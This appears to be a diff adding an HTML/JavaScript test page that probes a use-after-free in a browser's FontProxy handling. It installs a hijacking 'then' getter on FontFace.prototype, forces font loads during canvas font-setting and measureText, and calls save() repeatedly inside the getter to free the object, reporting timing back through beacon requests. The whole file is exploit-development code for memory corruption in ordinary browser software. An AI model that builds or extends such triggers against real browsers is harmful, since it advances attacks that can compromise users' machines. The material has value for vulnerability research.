@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V937</title></head>
+<body><pre id="out">V937 - FontProxy UAF window anatomy: when does the local() load settle? font-set vs measureText split + glyph-fallback load inside metrics</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(t,d){
+  try{var x=new XMLHttpRequest();x.open('GET','/beacon/V937-'+t+'?d='+encodeURIComponent(String(d===undefined?'':d).slice(0,700))+'&t='+Date.now(),false);x.send(null);}catch(e){}
+  O.textContent+='\n'+t+' '+(d===undefined?'':d);
+}
+
+/*
+ * v936 resolved: loaded fulfills with the FACE (isFace=true), beginLayer
+ * is absent (lane closed), loadingdone is async. But the then-getter never
+ * fired during v935's D0-D3 runs even though status=loaded was read in the
+ * same task as measureText. Remaining hypothesis: the load settles during
+ * ctx.font = ... (eager cascade realization on this port) BEFORE the
+ * getter is installed - measureText then finds a realized font and never
+ * reloads, so the UAF window never opens.
+ *
+ * S1 - SPLIT: font set, beacon status IMMEDIATELY (no getter yet). Then
+ *      getter install, measureText, beacon again. status after font-set:
+ *        loaded  -> eager: window dead in this shape (goes to S3)
+ *        unloaded-> load pending; getter installs; measureText decides
+ *   S2 - GETTER-FIRST: getter installed before ANY font touch. If the
+ *      settle is inline at load completion, the getter fires during
+ *      font-set (no stale pointer there - proves mechanics, not bug,
+ *      but routes the lane).
+ *   S3 - GLYPH FALLBACK: face with family 'sans-serif' (generic family
+ *      as FontFace family name) src local('Arial'). Primary font already
+ *      realized (S1 face). measureText('中中') / emoji - if the primary
+ *      font lacks coverage, per-glyph fallback resolution consults the
+ *      FontFaceSet INSIDE metricsOfPrimaryFont -> face load attempt ->
+ *      sync local() load -> settle -> Get(face,"then") -> getter INSIDE
+ *      the window -> 18 saves -> freed FontProxy -> UAF.
+ *
+ * Beacon order is the diagnosis. Single load, single page.
+ */
+
+function hook(ctx, tag, saver){
+  var n=0;
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      n++;
+      if(n>1) return undefined;
+      bk(tag+'-F','GETTER FIRED ('+tag+')');
+      try{ saver(); }catch(e){ bk(tag+'-save-err',String(e)); }
+      bk(tag+'-G','getter done');
+      return undefined;
+    }
+  });
+  return function unhook(){ try{ delete FontFace.prototype.then; }catch(e){} };
+}
+
+/* S1: split font-set vs measureText */
+try{
+  var f1=new FontFace('V1F','local(\'SST\')'); f1.loaded;
+  document.fonts.add(f1);
+  var c1=document.createElement('canvas').getContext('2d');
+  c1.save(); c1.lineWidth=0.5;
+  c1.font='10px V1F';
+  bk('S1-FONTSET','status right after ctx.font = '+f1.status);
+  var u1=hook(c1,'S1',function(){ for(var j=0;j<18;j++){ c1.save(); c1.lineWidth=1+j; } });
+  var w1=c1.measureText('a');
+  bk('S1-MT','measureText done w='+w1.width+' status='+f1.status);
+  u1();
+}catch(e){ bk('S1-throw',String(e)); }
+
+/* S2: getter-first (settle-at-font-set proof) */
+try{
+  var f2=new FontFace('V2F','local(\'Arial\')'); f2.loaded;
+  document.fonts.add(f2);
+  var c2=document.createElement('canvas').getContext('2d');
+  var u2=hook(c2,'S2',function(){ for(var j=0;j<18;j++){ c2.save(); c2.lineWidth=1+j; } });
+  c2.font='10px V2F';
+  bk('S2-FONTSET','status after ctx.font = '+f2.status);
+  var w2=c2.measureText('a');
+  bk('S2-MT','measureText done w='+w2.width+' status='+f2.status);
+  u2();
+}catch(e){ bk('S2-throw',String(e)); }
+
+/* S3: glyph-fallback load inside metrics (runs regardless of S1 outcome) */
+try{
+  var f3=new FontFace('sans-serif','local(\'Arial\')'); f3.loaded;
+  document.fonts.add(f3);
+  var c3=document.createElement('canvas').getContext('2d');
+  c3.save(); c3.lineWidth=0.5;
+  c3.font='10px V1F';                       /* primary font: already-known-loading family */
+  bk('S3-PRE','primary status f1='+f1.status+' fallback face status='+f3.status);
+  var u3=hook(c3,'S3',function(){ for(var j=0;j<18;j++){ c3.save(); c3.lineWidth=1+j; } });
+  var w3a=c3.measureText('\u4E2D\u4E2D');
+  bk('S3-CJK','CJK measureText w='+w3a.width+' f3.status='+f3.status);
+  var w3b=c3.measureText('\uD83D\uDE00\uD83D\uDE00');
+  bk('S3-EMOJI','emoji measureText w='+w3b.width+' f3.status='+f3.status);
+  u3();
+}catch(e){ bk('S3-throw',String(e)); }
+
+bk('DONE','script end');
+</script></body></html>
